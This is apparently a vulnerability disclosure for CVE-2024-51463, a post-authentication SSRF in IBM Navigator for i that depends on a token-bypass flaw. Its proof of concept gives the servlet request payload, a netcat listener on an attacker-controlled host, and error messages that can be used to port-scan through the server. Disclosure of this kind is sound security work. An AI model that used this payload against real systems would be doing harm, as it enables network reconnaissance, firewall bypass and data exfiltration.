[Product]
Navigator for i is a Web console interface where you can perform the
key tasks to administer your IBM i.
IBM Navigator for i supports the vast majority of tasks that were
available in the System i Navigator Windows client application.
This Web application is part of the base IBM i operating system, and
can be easily accessed from your web browser.

[Vulnerability Type]
Server Side Request Forgery (SSRF)

[CVE Reference]
CVE-2024-51463

[Security Issue]
IBM i is vulnerable to server-side request forgery (SSRF). This may
allow an authenticated attacker to send unauthorized requests from the
system,
potentially leading to network enumeration or facilitating other attacks.

post auth server side request forgery on non managed nodes to external
hosts on any TCP ports. There are two call vectors that can be abused
here,
one is the "Test TLS connection" but it only allows connections to TCP
port 9476.

However, there exists another servlet method called "testConnectPort"
which an authenticated attacker can use to connect to any IP and PORT
outside of the LAN. This can be abused for port scans, information
disclosure, exfil data., bypass firewall rules to attack non managed
nodes
or connect to attacker controlled C2 infrastructure.

This SSRF relies on exploiting a HTTP servlet generated security token
bypass CVE-2024-51464, where intercepted HTTP request MN tokens are
incremented or padded with zero. This attacker controlled MN token is
now seen as valid and the HTTP 403 Forbidden restriction is bypassed.

[Exploit/POC]
1)  attacker payload

POST /Navigator/DispatcherServlet/serviceability/testPortConnection?system=10.1.1.4
{"hostname":"10.2.10.16", "port":445}

2) attackers c2 server

â”Œâ”€â”€(rootï’€ggKali)-[/usr/share]
â””â”€# nc -llvp 445
listening on [any] 445 ...
connect to [10.2.10.16] from victimhost [10.1.1.4] 44569

For port scan we can infer if external host ports are open or closed
using error responses.

Port is open:
Error 500: Connection reset

Port is closed
Error 500: A remote host refused an attempted connect
